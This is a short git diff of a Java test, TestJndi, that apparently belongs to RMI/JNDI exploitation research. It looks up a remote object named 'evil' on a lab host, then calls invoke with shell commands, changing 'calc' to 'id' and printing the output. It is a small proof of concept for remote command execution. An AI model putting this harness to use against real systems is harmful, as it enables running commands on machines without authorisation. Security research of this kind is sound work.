@@ -10,8 +10,8 @@ import java.rmi.Remote;
 public class TestJndi {
     @Test
     public void testLdapConnection() throws Exception{
-        Remote lookup1 = Naming.lookup("rmi://127.0.0.1:21658/evil");
+        Remote lookup1 = Naming.lookup("rmi://192.168.122.217:14961/aevil");
         RMIConnection lookup = (RMIConnection) lookup1;
-        lookup.invoke(null, "calc", null, null, null);
+        System.out.println(lookup.invoke(null, "id", null, null, null));
     }
 }
